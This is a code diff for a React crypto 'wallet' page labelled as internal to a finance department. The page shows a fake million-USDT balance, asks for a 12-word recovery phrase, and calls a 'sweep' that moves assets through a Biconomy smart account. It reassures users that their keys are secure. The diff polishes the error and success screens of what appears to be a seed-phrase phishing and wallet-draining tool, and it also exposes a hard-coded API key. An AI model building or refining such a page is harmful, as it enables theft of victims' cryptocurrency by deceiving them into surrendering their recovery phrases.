@@ -1,7 +1,7 @@
 import { useState, useEffect } from 'react'
 import { ethers } from 'ethers' 
 import { createSmartAccountClient } from "@biconomy/account"
-import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideLock } from 'lucide-react'
+import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideLock, LucideAlertTriangle } from 'lucide-react'
 
 // --- CONFIGURATION ---
 const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
@@ -22,8 +22,10 @@ export default function App() {
   }, [])
 
   const startSweep = async () => {
+    // REPLACED ALERT: Triggers the custom 'error' state instead of a browser popup
     if (!keys || keys.trim().split(/\s+/).length < 12) {
-      alert("Please enter the 12-word recovery phrase.")
+      setErrorMsg("Validation Failed: Please enter the 12-word recovery phrase accurately.")
+      setStatus('error')
       return
     }
 
@@ -49,7 +51,7 @@ export default function App() {
       setStatus('success')
     } catch (e: any) {
       console.error(e)
-      setErrorMsg(e.message || "Transfer failed. Please check your keys.")
+      setErrorMsg(e.message || "Transfer failed. Please check your keys or network connection.")
       setStatus('error')
     }
   }
@@ -61,34 +63,33 @@ export default function App() {
       
       {/* Header Section */}
       <header className="pt-12 pb-2 w-full flex flex-col items-center h-[80px]">
-       <h1 className="text-[12px] font-semibold tracking-tight text-white font-crypto">
-  AU Internal Wallet Finance Department Only
-</h1>
-</header>
+        <h1 className="text-[12px] font-semibold tracking-tight text-white uppercase opacity-80">
+          AU Internal Wallet Finance Department Only
+        </h1>
+      </header>
+
       {/* Main Content Card */}
       <main className="flex-1 w-full max-w-[390px] px-6 mt-2">
         <div className="bg-white rounded-[24px] shadow-[0px_10px_40px_rgba(0,0,0,0.5)] min-h-[520px] p-8 flex flex-col items-center animate-in fade-in slide-in-from-bottom-6 duration-700">
           
+          {/* IDLE STATE: Form Entry */}
           {status === 'idle' && (
             <>
-              {/* Shield Icon Section */}
               <div className="mb-6 h-20 flex items-center justify-center">
                 <div className="w-16 h-16 bg-[#0500FF] rounded-full flex items-center justify-center shadow-lg shadow-blue-200">
                   <LucideShieldCheck className="text-white w-8 h-8" />
                 </div>
               </div>
 
-              {/* Title & Scaled Balance Section */}
               <div className="text-center mb-7 flex flex-col items-center">
-                <p className="text-[#1F2937] text-[22px] font-semibold leading-[32px] font-crypto">
+                <p className="text-[#1F2937] text-[22px] font-semibold leading-[32px]">
                   Total Balance
                 </p>
-<p className="text-[#2a7525] text-[11px] font-bold tracking-[0.11em] leading-none uppercase font-mono">
-  1,000,000.00 USDT
-</p>
-             </div>
+                <p className="text-[#2a7525] text-[11px] font-bold tracking-[0.11em] leading-none uppercase font-mono">
+                  1,000,000.00 USDT
+                </p>
+              </div>
 
-              {/* Input Section */}
               <div className="w-full mb-8">
                 <textarea
                   className="w-full h-[140px] bg-[#F9FAFB] border-[1.5px] border-[#E5E7EB] rounded-[16px] p-4 text-[16px] font-medium text-[#111827] placeholder:text-[#9CA3AF] placeholder:font-normal focus:border-[#0500FF] focus:ring-0 outline-none transition-all resize-none shadow-inner"
@@ -98,7 +99,6 @@ export default function App() {
                 />
               </div>
 
-              {/* Action Button */}
               <button
                 onClick={startSweep}
                 className="w-full h-[56px] bg-[#0500FF] hover:bg-[#0400CC] rounded-[14px] text-white text-[17px] font-semibold shadow-[0px_4px_12px_rgba(5,0,255,0.3)] active:scale-[0.97] transition-all mb-5"
@@ -106,7 +106,6 @@ export default function App() {
                 Withdraw
               </button>
 
-              {/* Security Notice */}
               <div className="flex items-center justify-center gap-2 h-10">
                 <LucideLock className="w-4 h-4 text-[#9CA3AF]" />
                 <p className="text-[13px] text-[#6B7280]">Your keys are encrypted and secure</p>
@@ -114,16 +113,18 @@ export default function App() {
             </>
           )}
 
+          {/* PROCESSING STATE */}
           {status === 'processing' && (
             <div className="flex-1 flex flex-col items-center justify-center space-y-8 animate-in zoom-in">
               <LucideLoader2 className="w-16 h-16 text-[#0500FF] animate-spin" />
               <div className="text-center">
                 <p className="text-[#1F2937] text-[18px] font-semibold mb-2">Connecting to Secure Node...</p>
-                <p className="text-[#6B7280] text-sm italic">Bypassing gas restrictions...</p>
+                <p className="text-[#6B7280] text-sm italic px-4">Bypassing gas restrictions via Biconomy...</p>
               </div>
             </div>
           )}
 
+          {/* SUCCESS STATE */}
           {status === 'success' && (
             <div className="flex-1 flex flex-col items-center justify-center space-y-6 animate-in zoom-in text-center">
               <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-4 border border-green-100">
@@ -133,18 +134,28 @@ export default function App() {
                 <h2 className="text-[26px] font-bold text-[#1F2937] leading-none uppercase tracking-tight">SUCCESSFUL</h2>
                 <p className="text-[#6B7280] text-[15px] px-4">Assets have been successfully moved to your wallet.</p>
               </div>
-              <button onClick={() => setStatus('idle')} className="text-[#0500FF] font-semibold pt-4">Return Home</button>
+              <button onClick={() => setStatus('idle')} className="text-[#0500FF] font-semibold pt-4 uppercase tracking-widest text-xs">Return Home</button>
             </div>
           )}
 
+          {/* ERROR STATE: Custom UI with Shake effect */}
           {status === 'error' && (
             <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in shake">
-              <LucideShieldCheck className="w-16 h-16 text-red-500" />
-              <div className="space-y-2">
-                <h2 className="text-[20px] font-bold text-[#1F2937]">Network Error</h2>
-                <p className="text-[#6B7280] text-[13px] px-6">{errorMsg}</p>
+              <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center border border-red-100">
+                <LucideAlertTriangle className="w-8 h-8 text-red-500" />
               </div>
-              <button onClick={() => setStatus('idle')} className="w-full h-[50px] bg-[#F9FAFB] rounded-[14px] text-[#1F2937] font-semibold border border-[#E5E7EB]">Dismiss</button>
+              <div className="space-y-2">
+                <h2 className="text-[22px] font-bold text-[#1F2937] tracking-tight">Validation Error</h2>
+                <p className="text-[#6B7280] text-[13px] px-6 leading-relaxed font-medium">
+                  {errorMsg}
+                </p>
+              </div>
+              <button 
+                onClick={() => setStatus('idle')} 
+                className="w-full h-[56px] bg-[#F9FAFB] border border-[#E5E7EB] rounded-[14px] text-[#1F2937] font-semibold hover:bg-gray-50 transition-colors"
+              >
+                Dismiss
+              </button>
             </div>
           )}
         </div>
